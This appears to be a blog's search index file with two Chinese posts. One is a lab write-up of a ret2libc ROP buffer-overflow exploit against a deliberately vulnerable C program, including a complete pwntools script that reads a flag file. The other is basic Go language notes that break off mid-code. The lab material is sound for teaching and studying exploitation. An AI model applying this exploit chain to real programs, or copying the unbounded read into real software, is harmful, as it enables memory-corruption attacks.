<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ret2libc多函数调用</title>
      <link href="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/"/>
      <url>/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><h2 id="操作系统-amp-工具"><a href="#操作系统-amp-工具" class="headerlink" title="操作系统 &amp; 工具"></a>操作系统 &amp; 工具</h2><ul><li><p>操作系统：<code>5.16.0-kali7-amd64</code></p></li><li><p><code>pwntools</code></p><pre><code>apt-get updateapt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essentialpython3 -m pip install --upgrade pippython3 -m pip install --upgrade pwntools</code></pre></li></ul><p>Tips：由于需要在命令行中使用<code>cyclic、readelf、ropper</code>等工具，需要将工具的所在位置<code>“/home/kali/.local/bin”</code>添加到<code>PATH</code>中，这里采用了<a href="https://blog.csdn.net/zerolity/article/details/78505455?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&amp;utm_relevant_index=2">方法二</a></p><ul><li><p><code>pwngdb</code></p><pre><code>git clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.sh</code></pre></li></ul><p>安装成功后结果如图</p><p><img src="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20220420192235374.png" alt="image-20220420192235374"></p><h2 id="待rop程序"><a href="#待rop程序" class="headerlink" title="待rop程序"></a>待<code>rop</code>程序</h2><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* stack.c */</span><span class="token macro property">#<span class="token directive keyword">define</span> _GNU_SOURCE</span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;dlfcn.h></span></span><span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"IOLI Crackme Level 0x00\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Password:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"250382"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Password OK :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Invalid Password!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">setreuid</span><span class="token punctuation">(</span><span class="token function">geteuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">geteuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//直接从流中读入数据或者直接向流中写入数据，而没有缓冲区</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> _IONBF<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="编译-amp-系统选项"><a href="#编译-amp-系统选项" class="headerlink" title="编译 &amp; 系统选项"></a>编译 &amp; 系统选项</h2><ul><li><p>stack保护(<code>stack canary</code>)，默认开启</p><ul><li><code>-fno-stack-protector / -fstack-protector</code></li></ul></li><li><p><code>NX(No-eXecute)</code>，默认开启</p><ul><li><p>即不可执行保护</p></li><li><p><code>-z execstack</code></p></li></ul></li><li><p><code>PIE</code>，默认开启</p><ul><li>每次加载程序时变换加载地址</li><li><code>-no-pie / -pie</code></li></ul></li><li><p>32位编译选项</p><ul><li><code>-m32</code></li></ul></li><li><p><code>ASLR</code>设置</p><ul><li><code>sudo sysctl -w kernel.randomize_va_space= 0关闭 / 2开启)</code></li></ul></li></ul><pre><code>#完整的编译指令gcc -m32 stack.c -o stack -fno-stack-protector</code></pre><p>Tips：使用<strong>“-m32”</strong>可能会报错<strong>“/usr/include/stdio.h:27:10: fatal error: bits/libc-header-start.h”</strong>，原因是gcc安装环境没有安装完善，使用<code>sudo apt install gcc-multilib</code>即可解决。</p><h1 id="执行步骤"><a href="#执行步骤" class="headerlink" title="执行步骤"></a>执行步骤</h1><h2 id="cyclic获取溢出点"><a href="#cyclic获取溢出点" class="headerlink" title="cyclic获取溢出点"></a>cyclic获取溢出点</h2><p>进入<code>pwngdb</code>，使用<code>cyclic 100</code>生成100字节的字符串作为程序输入</p><pre><code>$ gdb ./stackpwndbg&gt; cyclic 100aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaapwndbg&gt; runStarting program: /home/kali/Desktop/SysSecurity/stackIOLI Crackme Level 0x00Password:aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</code></pre><p>观察到程序崩溃并给出一个无效地址</p><p><img src="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20220420194344949.png" alt="image-20220420194344949"></p><p>用改地址回到cyclic进行比较，可以知道溢出点位置为76</p><p><img src="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20220420194503718.png" alt="image-20220420194503718"></p><h2 id="获取PR-x2F-PPR-x2F-PPPR的地址"><a href="#获取PR-x2F-PPR-x2F-PPPR的地址" class="headerlink" title="获取PR/PPR/PPPR的地址"></a>获取PR/PPR/PPPR的地址</h2><p><a href="https://blog.csdn.net/qq_42750240/article/details/121989094?ops_request_misc=%7B%22request_id%22:%22165043814016780265485394%22,%22scm%22:%2220140713.130102334..%22%7D&amp;request_id=165043814016780265485394&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-121989094.142%5Ev9%5Epc_search_result_control_group,157%5Ev4%5Econtrol&amp;utm_term=rop%E6%98%AF%E4%BB%80%E4%B9%88&amp;spm=1018.2226.3001.4187"> 什么是ROP系统攻击</a></p><p><a href="https://blog.csdn.net/weixin_44932880/article/details/103692899">通用gadget详解</a></p><p>（一个P对应一个参数，在使用了某个函数后需要使用POP指令将其参数从栈中弹出）</p><pre><code>ropper --file ./stack | grep "pop" | grep "ret"</code></pre><p><img src="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20220420195013287.png" alt="image-20220420195013287"></p><p>这是这几个gadget在程序中的<strong>偏移地址</strong>，在使用时需要加上程序加载的基地址。</p><h2 id="获取lib加载地址"><a href="#获取lib加载地址" class="headerlink" title="获取lib加载地址"></a>获取lib加载地址</h2><p>在<code>pwndbg</code>中使用<code>print</code></p><p><img src="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20220420195237389.png" alt="image-20220420195237389"></p><p>再通过<code>readelf</code>工具获取上述函数在<code>libc</code>中的偏移地址，想减计算出<code>libc</code>的加载地址</p><p><img src="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20220420195514093.png" alt="image-20220420195514093"></p><h2 id="获取程序加载地址"><a href="#获取程序加载地址" class="headerlink" title="获取程序加载地址"></a>获取程序加载地址</h2><p>通过查找程序中特殊字符串的<strong>地址</strong>和<strong>偏移地址</strong>相减，获得程序加载地址</p><pre><code>#在命令行中ropper --file ./stack --string "Password OK"</code></pre><p>得到偏移地址</p><p><img src="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20220420195808275.png" alt="image-20220420195808275"></p><pre><code>#在pwndbg中b main        #在main函数前设置断点runsearch "Password OK"</code></pre><p>得到字符串执行时的地址</p><p><img src="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20220420200015846.png" alt="image-20220420200015846"></p><h2 id="完成攻击脚本"><a href="#完成攻击脚本" class="headerlink" title="完成攻击脚本"></a>完成攻击脚本</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./stack"</span><span class="token punctuation">)</span>PR <span class="token operator">=</span> <span class="token number">0x0000138b</span>PPR <span class="token operator">=</span> <span class="token number">0x0000138a</span>PPPR <span class="token operator">=</span> <span class="token number">0x00001389</span><span class="token comment" spellcheck="true">#字符填充</span>payload <span class="token operator">=</span> b<span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">76</span><span class="token comment" spellcheck="true">#根据system地址获取libc加载地址</span>system_addr <span class="token operator">=</span> <span class="token number">0xf7dfdd00</span>system_offset <span class="token operator">=</span> <span class="token number">0x00044cc0</span>libc_load_addr <span class="token operator">=</span> system_addr <span class="token operator">-</span> system_offset<span class="token comment" spellcheck="true">#用到函数的地址</span>printf_addr <span class="token operator">=</span> <span class="token number">0xf7e0cf10</span>open_addr <span class="token operator">=</span> <span class="token number">0xf7eaa770</span>write_addr <span class="token operator">=</span> <span class="token number">0xf7eaad50</span>read_addr <span class="token operator">=</span> <span class="token number">0xf7eaac90</span>puts_addr <span class="token operator">=</span> <span class="token number">0xf7e284e0</span>gets_addr <span class="token operator">=</span> <span class="token number">0xf7e27a00</span>exit_addr <span class="token operator">=</span> <span class="token number">0xf7df0680</span><span class="token comment" spellcheck="true">#bss段地址，可通过readelf -S ./stack查看</span>bss_offset <span class="token operator">=</span> <span class="token number">0x00004038</span><span class="token comment" spellcheck="true">#bss2手动设置的缓冲区</span>bss2_offset <span class="token operator">=</span> <span class="token number">0x00004038</span> <span class="token operator">+</span> <span class="token number">20</span>passwd_ok_offset <span class="token operator">=</span> <span class="token number">0x00002031</span>passwd_ok_addr <span class="token operator">=</span> <span class="token number">0x56557031</span>load_addr <span class="token operator">=</span> passwd_ok_addr <span class="token operator">-</span> passwd_ok_offsetpayload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>gets_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># gets</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>PR <span class="token operator">+</span> load_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss_offset <span class="token operator">+</span> load_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 读取数据到bss</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># puts回显</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>PR <span class="token operator">+</span> load_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss_offset <span class="token operator">+</span> load_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 输出bss数据</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>open_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>PPR <span class="token operator">+</span> load_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss_offset <span class="token operator">+</span> load_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 打开bss中的目标文件，即flag文件</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>PPPR<span class="token operator">+</span> load_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># “3”即时open函数得到的flag文件对应的句柄</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss2_offset <span class="token operator">+</span> load_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 读到bss2缓冲区</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>PPPR<span class="token operator">+</span> load_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 标准输出</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss2_offset <span class="token operator">+</span> load_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 将bss2缓冲区的数据输出到标准输出</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>exit_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>代码依次执行了<code>gets——&gt;puts——&gt;open——&gt;read——&gt;write</code>函数，执行了如下的功能</p><ol><li>gets函数读取程序员手动输入的文件路径，将其保存在<code>bss</code>中</li><li>puts函数对<code>bss</code>中的数据进行输出（验证是否正确保存）</li><li>open函数打开对应文件，得到文件句柄**”3”**</li><li>read函数从文件中读取数据到<code>bss2</code>中</li><li>write函数将<code>bss2</code>中的数据输出到标准输出</li></ol><p>执行结果如下所示：</p><p><img src="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20220420201534875.png" alt="image-20220420201534875"></p><h2 id="开启ASLR再次执行"><a href="#开启ASLR再次执行" class="headerlink" title="开启ASLR再次执行"></a>开启ASLR再次执行</h2><pre><code>#开启ASLRsudo sysctl -w kernel.randomize_va_space=2</code></pre><p>发现无法正常执行</p><p><img src="/2022/04/20/ret2libc%E5%A4%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8/image-20220420201841071.png" alt="image-20220420201841071"></p><h1 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h1><p><a href="https://qeryu.github.io/2022/04/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8lab1/">信息系统安全Lab1 - 胡思乱想集散中心 (qeryu.github.io)</a></p>]]></content>
      
      
      <categories>
          
          <category> record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goNote</title>
      <link href="/2022/03/10/goNote/"/>
      <url>/2022/03/10/goNote/</url>
      
        <content type="html"><![CDATA[<h1 id="Go安装"><a href="#Go安装" class="headerlink" title="Go安装"></a>Go安装</h1><ul><li><code>GOPATH</code>:你写Go代码的工作区，保存你的Go代码的。</li><li><code>go env</code></li><li><code>GOPATH/bin</code>添加到环境变量<ul><li>环境变量：当前目录下找不到相关命令时，到环境变量目录中寻找相关命令</li><li><code>go install</code>命令会把生成的二进制可执行文件拷贝到<code>bin</code>中</li></ul></li></ul><h1 id="Go命令"><a href="#Go命令" class="headerlink" title="Go命令"></a>Go命令</h1><ul><li><code>go build</code>：编译Go程序</li><li><code>go build -o "xx.exe"</code>：编译成<code>xx.exe</code>文件</li><li><code>go run main.go</code>：像执行脚本一样执行<code>mian.go</code>文件</li><li><code>go install</code>：先编译后拷贝</li></ul><h1 id="Go语言文件基础语法"><a href="#Go语言文件基础语法" class="headerlink" title="Go语言文件基础语法"></a>Go语言文件基础语法</h1><ul><li>文件第一行：<code>package</code>关键字声明包名</li><li>单行注释：<code>//</code></li><li>多行注释：<code>/* */</code></li><li>如果要编译一个可执行文件，必须要有一个<code>main</code>包，和一个<code>main</code>函数(入口函数，无参数和返回值)</li><li><code>go</code>语言函数外的语句必须以<strong>关键字</strong>开头</li><li>函数内部定义的变量必须使用</li></ul><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><ul><li>三种声明方式：<ul><li><code>var name type</code></li><li><code>var name = "zhangsan"</code></li><li><code>name := "zhangsan" </code>只能在函数内使用</li></ul></li><li>匿名变量（哑元变量）<ul><li>当有些数据必须用变量接收，但又不使用它时，使用<code>_</code>接收</li></ul></li></ul><h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><ul><li><code>const pi = 3.1415926</code></li><li><code>const UserNotExistErr = 10000</code></li><li><code>iota</code>实现枚举<ul><li><code>iota</code>在<code>const</code>关键字出现时将被重置为0</li><li><code>const</code>中每新增一行常量声明，<code>iota</code>累加1</li></ul></li><li><code>nil</code>指没有分配内存</li></ul><h1 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h1><ul><li><p><code>if</code></p><ul><li><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> age <span class="token operator">=</span> <span class="token number">19</span><span class="token keyword">if</span> age <span class="token operator">></span><span class="token number">18</span><span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"成年了"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> age<span class="token operator">></span><span class="token number">7</span><span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"上小学"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"最快乐的时光"</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li></ul></li><li><p><code>for</code></p><ul><li><p>各种<code>for</code>循环</p><pre class=" language-go"><code class="language-go"><span class="token keyword">for</span> i<span class="token operator">:=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> <span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre class=" language-go"><code class="language-go"><span class="token keyword">for</span><span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"无限循环"</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><pre class=" language-go"><code class="language-go"><span class="token comment" spellcheck="true">//基于范围的for循环</span>s <span class="token operator">:=</span> <span class="token string">"hello"</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//i是索引</span><span class="token keyword">for</span> i<span class="token punctuation">,</span>v<span class="token operator">:=</span><span class="token keyword">range</span> s<span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"第%d个字母是%c\n"</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li></ul></li><li><p><code>switch</code></p><ul><li><pre class=" language-go"><code class="language-go"><span class="token keyword">switch</span> op<span class="token punctuation">{</span>    <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">//...(无break)</span>    <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span>：    <span class="token comment" spellcheck="true">//...</span>    <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">//...</span>    <span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">//...</span><span class="token punctuation">}</span></code></pre></li></ul></li></ul><h1 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h1><ul><li><p>整型</p><ul><li><p>无符号整型</p><ul><li><code>uint8</code>,<code>uint16</code>,<code>uint32</code>,<code>uint64</code></li></ul></li><li><p>有符号整型</p><ul><li><code>int8</code>,<code>int16</code>,<code>int32</code>,<code>int64</code></li></ul></li><li><p><code>int</code>具体是32位或64位取决于操作系统</p></li><li><p><code>uintptr</code>表示指针</p></li><li><p>其他进制数</p><ul><li><p>八进制</p><p><code>var n = 0777</code></p></li><li><p>十六进制</p><p><code>var n = 0xff</code></p></li></ul></li></ul></li><li><p>浮点型</p><ul><li><code>float32</code></li><li><code>float64</code>（默认）</li><li>两种类型不能直接比较</li></ul></li><li><p>布尔值</p><ul><li><p><code>bool</code></p></li><li><p><code>true</code>和<code>false</code></p></li><li><p>不能和其他类型转换</p></li></ul></li><li><p>复数</p><ul><li><code>complex128</code></li><li><code>complex64</code></li></ul></li><li><p>字符串</p><ul><li><p><code>string</code></p></li><li><p>使用双引号、反引号包裹，其中<strong>反引号</strong>支持多行字符串，且自动转义字符，不需要使用<code>\</code></p></li><li><p>字符串<strong>不能修改</strong></p><ul><li><p>如果要修改字符串，需要先将其转换成<code>[]rune</code>或<code>[]byte</code>类型，完成后再转换成<code>string</code>类型。无论哪种转换，都会重新分配内存，并复制字节数组。</p></li><li><pre class=" language-go"><code class="language-go">s2<span class="token operator">:=</span><span class="token string">"白萝卜"</span>s3<span class="token operator">:=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">rune</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//把字符串强制转换乘一个rune切片</span>s3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'红'</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>s3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//把rune切片强制转换成字符串</span></code></pre></li></ul></li><li><p>go语言中字符串都是<code>utf-8</code>编码，一个常用汉字一般占3个字节</p></li><li><p>字符串的<strong>常用操作</strong></p><p><img src="/2022/03/10/goNote/image-20210820175114919.png"></p><ul><li><code>var str = fmt.Sprintf("%s%s",str1,str2)</code></li></ul></li></ul></li><li><p><code>byte(uint8)</code>和<code>rune</code>(<code>int32</code>)</p><ul><li>均属于类型别名</li></ul></li></ul><h1 id="fmt占位符"><a href="#fmt占位符" class="headerlink" title="fmt占位符"></a>fmt占位符</h1><ul><li><code>%T</code>查看类型</li><li><code>%v</code>查看变量的值，万能的</li><li><code>%d</code>查看十进制</li><li><code>%b</code>查看二进制</li><li><code>%o</code>查看八进制</li><li><code>%x</code>查看十六进制</li><li><code>%s</code>查看字符串</li></ul><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><ul><li>算术运算符<ul><li><code>+，-，*，/</code></li></ul></li><li>逻辑运算符<ul><li><code>&amp;&amp;，||，!</code></li></ul></li><li>位运算符<ul><li><code>&gt;&gt;,&lt;&lt;,|,^,&amp;</code></li></ul></li><li>赋值运算符<ul><li><code>=,+=,-=</code></li></ul></li><li>比较运算符<ul><li><code>&lt;,&gt;,&lt;=,&gt;=,==</code></li></ul></li></ul><h1 id="复合数据类型"><a href="#复合数据类型" class="headerlink" title="复合数据类型"></a>复合数据类型</h1><h2 id="数组（Array）"><a href="#数组（Array）" class="headerlink" title="数组（Array）"></a>数组（Array）</h2><ul><li><p><code>var ages [30]int</code></p></li><li><p>数组声明包含元素的<strong>类型</strong>和元素的<strong>个数</strong>，元素的个数（数组的长度）属于数据类型的一部分</p></li><li><p>数组是<strong>值类型</strong>（与之对应的是<strong>引用类型</strong>）</p></li><li><p>数组的初始化</p><ul><li><code>var ages = [30]int{1,2,3,4,5}</code></li><li><code>var ages = [...]int{1,2,3,4,5,6,7,8}</code></li><li><code>var ages = [...]int{1:1,99:2}</code>指定<strong>索引</strong></li></ul></li><li><p>二维数组</p><ul><li><p><code>var a1 [3][2]int</code>表示3个<code>[2]int</code>类型组成的数组</p></li><li><p>只有外层<code>[]</code>可以使用<code>...</code></p></li><li><p>初始化</p><ul><li><pre class=" language-go"><code class="language-go">a1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span>    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">{</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span></code></pre></li></ul></li></ul></li></ul><h2 id="切片（slice）"><a href="#切片（slice）" class="headerlink" title="切片（slice）"></a>切片（slice）</h2><ul><li><p>声明切片<code>var s1 []int</code>，没有分配内存，即<code>==nil</code></p></li><li><p>切片是<strong>引用</strong>类型</p></li><li><p>初始化</p><ul><li><code>s1 = []int{1,2,3}</code></li><li><code>make</code>初始化，分配内存<ul><li><code>s1:=make([]string,2,4)</code></li><li>上面2是长度，4是容量（有容量即分配了内存）</li></ul></li></ul></li><li><p>切片与数组</p><ul><li>切片的本质是对底层数组的封装，它包含<strong>三个元素</strong>：底层数组的指针（指向切片第一个元素），切片的长度和切片的容量。</li><li><img src="/2022/03/10/goNote/image-20210904194925380.png"></li><li>常用操作<ul><li><code>slice：=array[x:y]</code></li></ul></li></ul></li><li><p>切片不能直接比较</p><ul><li><p>切片唯一合法的比较操作是和<code>nil</code>比较</p></li><li><p>一个<code>nil</code>值的切片长度和容量都是0，但是一个长度和容量都是0的切片不一定是<code>nil</code></p></li><li><pre class=" language-go"><code class="language-go"><span class="token 